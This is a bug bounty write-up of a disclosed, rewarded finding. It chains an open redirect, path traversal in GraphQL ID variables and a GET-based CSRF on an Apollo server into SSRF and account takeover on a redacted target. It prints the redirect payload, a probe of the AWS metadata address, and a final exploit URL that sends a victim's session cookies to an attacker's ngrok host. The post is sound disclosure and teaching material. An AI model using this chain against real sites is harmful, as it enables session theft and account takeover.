# Intro:

Recently, while testing a web application, I discovered multiple vulnerabilities that on chaining together could have allowed anyone to take over the Victim's account.The affected company’s name has been interchanged with "target" for the sake of confidentiality. The blog would detail how these vulnerabilities were discovered, chained, and exploited.

# From “../” to open redirect:

After some initial testing and fuzzing on ```https://target.com```, I found an open redirect issue. If we appended two */* at the beginning of the request ```GET /api/.. ``` we would get the following response.

```
HTTP 1.1 301

....
Location: //api/..
....
```
This would redirect us to host- **'api'** with path **/..**

After some trial and error, I came up with the following exploit - https://target/com///google.com// which would redirect the victim google.com!

![open redirect-1](/assets/img/open-redir-to-ato/open%20redirect-1.png){: .mx-auto.d-block :}

Simply reporting an open redirection vulnerability didn't seem exciting to me so I decided to dig deeper and try to escalate it with a different issue I may find.

# Path traversal in the wild:

While using the app as a normal user, with burp running in the background, I noticed that website made multiple requests to a Graphql API with a different query. Graphql is an API query language that requires only one endpoint to query and modify data. It is often used by websites as an alternative to REST APIs You can more about Graphql [here](https://graphql.org/)

I began analyzing the Graphql request one by one to check for any interesting behavior.A query **GetAuthorizedApps** grabbed my attention. This query was used to fetch any third-party apps that were connected to the account using OAuth.

![graphql-1](/assets/img/open-redir-to-ato/Graphql-1.png){: .mx-auto.d-block :}

The functionality of the query itself wasn't much of an interest. What actually did catch my eye was the **id** variable because it was being sent as a string instead of an Integer. My first assumption the value of this variable is being used to make a server-side request to an internal API for example - ``` http://localhost:8080/api/1/:ID ```. I quickly appended a single quote *‘* in hope that the server to throw an error. And the response -

![graphql-2](/assets/img/open-redir-to-ato/Graphql-2.png){: .mx-auto.d-block :}


I was right! The server was indeed making a request on behalf of the user, not to any internal host, but to the API endpoint available on the same web app! Now I checked if it was possible to use ‘../’ to traverse the endpoint path to the root of the website. Yes, It was possible. 

![graphql-3](/assets/img/open-redir-to-ato/Graphql-3.png){: .mx-auto.d-block :}

The root cause of this issue seems to be something in the URL resolving libraries that figures out the traversal before making the request.

# Issue 3: Path traversal + Open redirect = SSRF!

I created a mindmap of how the infrastructure of this app looked like. Here’s what I assumed-

The website uses REST endpoints to fetch, modify, and delete user data as well as a Graphql endpoint, which acts as a proxy for the REST API. The Graph queries would make server-side requests, on behalf of the user, to various REST endpoints to grab and modify the data. For example the Graphql query – 

```{“query”:”query GetUser($id: ID!){\n GetApps(id: $id)\n}}”,”variables”:{“ID”:”12345”}}``` would make an internal GET request to ```https://target.com/api/user/12345``` on behalf of the user.

So far, I had discovered an open redirect and a path traversal. It was now simple to chain these both issues and escalate to a Server Side Request Forgery Attack! I spun up a ngrok instance, an alternative to burp collaborator, for receiving the incoming request to confirm the issue. You’d have probably guessed by now how the final exploit chain looked like. Here’s mine –

![SSRF-1](/assets/img/open-redir-to-ato/ssrf-exp-1.png){: .mx-auto.d-block :}

Since we already have an open redirection and a path traversal, the first 4 '../' would traverse the path up by 4 directories and the ///XXXXXXXX.ngrok.io// would cause a redirection to our server confirming the SSRF.

Here's the Request that I received was – 

![SSRF-2](/assets/img/open-redir-to-ato/SSRF-2.png){: .mx-auto.d-block :}


# Falling on the face

Awesome now we have an SSRF! The next obvious step was to fetch the cloud metadata of the AWS ec2 instance. I wrote a python script to create an Http Server and redirect every inbound request to http://169.254.169.254. I bound this script with the ngrok instance. This was important because the server only made requests to ```https://``` instead of ```http://```, and the metadata is only accessible on port 80. Here’s the response.

![ssrf-exp-1](/assets/img/open-redir-to-ato/SSRF-exp-1.png){: .mx-auto.d-block :}

Bummer!! :(  I was unable to read the response! But why? Turns out that the server is expecting a JSON response with the objects success and key, instead of plain or HTML for all the 200 OK requests and threw an error if the status code wasn't 2XX.This error would return the whole response of the proxy request.

I could still map the internal network simply by making requests to the internal host but this would be assumed as a medium severity issue. as only errors were readable. After some more digging, I found a way to escalate it further to a much higher severity issue.
 
# Gotcha!

Remember the request we got on our ngrok after exploiting the SSRF? Let's take a look at it once again.

![ssrf-2-cookie](/assets/img/open-redir-to-ato/ssrf-2-cookie.png){: .mx-auto.d-block :}

Notice the cookie header which was sent along with the request. I soon realized that these were my session cookies! This was how the server was authenticating requests made on behalf of the user. However, this discovery was useless unless we could somehow force our victims to make this request and receive their cookie header.

My initial idea was to find an XSS and bypass the Same Origin Policy, make the malicious Graphql request on behalf of the victim, and then exfiltrate the cookies!


After spending a day looking for an XSS vulnerability, I give up, reported this as a Blind SSRF with the ability to read a partial response and began testing other parts of the app. I noticed another query "ZtsplXXXXXXX" whose behaviour was very similar to **GetAuthorized** query because this query used an ID variable to make internal requests too! 

![ssrf-exp-2](/assets/img/open-redir-to-ato/ssrf-2-exp.png)

However there is one major difference between the two. **GetAuthorized** is a _mutation_ query while **ZtsplXXXXXXX** is a normat query. As soon as I saw this, I knew I've got a complete account takeover.

The GraphQl endpoint was running on [Apollo](https://www.apollographql.com) server. This was exciting because according to its [docs](https://www.apollographql.com/docs/apollo-server/v1/requests/), the Apollo server also accept **GET** requests! 

An example query in GET request would look like :-

```GET /graphql?query=query aTest($arg1: String!) {test(who: $arg1) }&operationName=aTest&variables={"arg1":"me"}``` 

But there's a limitation.**mutation** queries cannot be executed via *GET* requests, only normal queries are allowed. We can use this "feature" to our advantage by using it as a CSRF in our chain!


# The "Hack"

So far we got 
1.	An open redirect
2.	A Path traversal
3.	A CSRF

Let's chain them together for our final exploit to grab the victim's cookie header!

```
https://target.com/api/graphql/v2?query=query ZtSpXXXXXXXXX($id: ID!) {  XXXXXXXX(id: $id) {    title    steps    headService {      id      name      __typename    }    tailService {      id      name      __typename    }    services {      id      name      __typename    }    __typename  }}&variables={"id":"1234/../../../../../..///xxxxxxx.ngrok.io//"}
```

As soon as the victim clicks the above link, their session cookies would be send to our ngrok server, which we can later use to access their account!

![ato-exp-1](/assets/img/open-redir-to-ato/)

# Timeline

Aug 29, 2020 - initial discovery of open redirect and path traversal

Aug 30, 2020 - esclated and updated the report as account takeover vulnerability

Sep 18, 2020 - bounty awarded as critical


<h3>Liked the article, have a question about the post or just wanna chat? feel free to reach out on [twitter](https://twitter.com/ninetyn1ne_) or send an email on [ninetyn1ne@protonmail.com](mailto:ninetyn1ne@protonmail.com)</h3>
